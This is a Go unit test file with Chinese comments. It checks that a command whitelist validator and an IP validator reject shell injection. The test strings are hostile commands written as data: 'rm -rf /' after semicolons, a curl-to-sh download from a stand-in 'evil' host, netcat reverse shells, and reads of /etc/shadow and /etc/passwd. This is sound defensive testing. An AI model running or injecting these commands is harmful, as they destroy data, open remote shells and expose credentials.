package security

import (
	"strings"
	"testing"
)

// TestValidateCmdRejectsInjection 校验「白名单前缀 + 分号注入」不再被放行。
//
// 旧实现用 strings.HasPrefix 判断整串前缀，`kill 1; rm -rf /` 以 `kill ` 开头
// 会被整体放行，白名单形同虚设。
func TestValidateCmdRejectsInjection(t *testing.T) {
	cases := []string{
		"kill 1; rm -rf /",
		"kill 1 && curl http://evil/x.sh | sh",
		"ps -ef || nc -e /bin/sh 1.2.3.4 4444",
		"iptables -L; cat /etc/shadow",
	}

	for _, cmd := range cases {
		if err := ValidateCmd(cmd, true); err == nil {
			t.Errorf("应拒绝注入命令: %q", cmd)
		}
	}
}

// TestValidateCmdRejectsControlChars 制表符/换行常被用来绕过基于空格的过滤。
func TestValidateCmdRejectsControlChars(t *testing.T) {
	for _, cmd := range []string{
		"kill\t1",
		"ps -ef\nrm -rf /",
		"kill 1\rrm -rf /",
	} {
		if err := ValidateCmd(cmd, true); err == nil {
			t.Errorf("应拒绝含控制字符的命令: %q", cmd)
		}
	}
}

// TestValidateCmdRejectsCommandSubstitution 命令替换必须一律拒绝。
func TestValidateCmdRejectsCommandSubstitution(t *testing.T) {
	for _, cmd := range []string{
		"echo $(cat /etc/passwd)",
		"echo `id`",
		"echo ${HOME}",
	} {
		if err := ValidateCmd(cmd, true); err == nil {
			t.Errorf("应拒绝命令替换: %q", cmd)
		}
	}
}

// TestValidateCmdRejectsUnknownCommand 未知命令（含被拆段后的命令）一律拒绝。
func TestValidateCmdRejectsUnknownCommand(t *testing.T) {
	for _, cmd := range []string{
		"nc -e /bin/sh 1.2.3.4 4444",
		"ps -ef | sh",
		"/bin/sh -c id",
		"sudo rm -rf /",
	} {
		if err := ValidateCmd(cmd, true); err == nil {
			t.Errorf("应拒绝非白名单命令: %q", cmd)
		}
	}
}

// TestValidateCmdAllowsRealCommands 现有调用点的真实命令必须继续通过，
// 否则端口转发 / iptables 功能会被误伤。
func TestValidateCmdAllowsRealCommands(t *testing.T) {
	cases := []string{
		`ps -ef | grep 'socat TCP\|socat UDP' | grep -v grep | grep -v watch`,
		"iptables -t nat -L DOCKER -n",
		"kill 12345",
		"kill -9 12345",
		"ps -p 12345 -o pid=",
		"nohup socat TCP-LISTEN:12345,reuseaddr,fork TCP:172.19.0.100:22 > /dev/null 2>&1 &",
		"iptables -t nat -A DOCKER -p tcp --dport 2222 -j DNAT --to-destination 172.17.0.2:22",
		"systemctl restart docker",
		"df -h",
	}
	for _, cmd := range cases {
		if err := ValidateCmd(cmd, true); err != nil {
			t.Errorf("合法命令被误拒: %q -> %v", cmd, err)
		}
	}
}

// TestValidateCmdPipePolicy allowPipe=false 时必须拒绝管道。
func TestValidateCmdPipePolicy(t *testing.T) {
	cmd := "ps -ef | grep socat"
	if err := ValidateCmd(cmd, false); err == nil {
		t.Fatal("allowPipe=false 时应拒绝管道")
	}
	if err := ValidateCmd(cmd, true); err != nil {
		t.Fatalf("allowPipe=true 时应放行: %v", err)
	}
}

// TestValidateIP 容器地址是用户可控值，非法值必须在拼接命令前被拒。
func TestValidateIP(t *testing.T) {
	valid := []string{"172.19.0.100", "10.0.0.1", "::1", "2001:db8::1"}
	for _, ip := range valid {
		if err := ValidateIP(ip); err != nil {
			t.Errorf("合法 IP 被拒: %s -> %v", ip, err)
		}
	}

	invalid := []string{
		"", "1.2.3.4; rm -rf /", "1.2.3.4|sh", "localhost",
		"1.2.3.4 && id", "999.1.1.1",
	}
	for _, ip := range invalid {
		if err := ValidateIP(ip); err == nil {
			t.Errorf("非法 IP 应被拒: %q", ip)
		}
	}
}

// TestValidateIPErrorMessage 错误信息不能回显完整命令，避免日志被注入撑爆。
func TestValidateIPErrorMessage(t *testing.T) {
	err := ValidateIP(strings.Repeat("a", 500) + "; rm -rf /")
	if err == nil {
		t.Fatal("应返回错误")
	}
	if len(err.Error()) > 200 {
		t.Errorf("错误信息过长（可能回显了整段输入）: %d", len(err.Error()))
	}
}
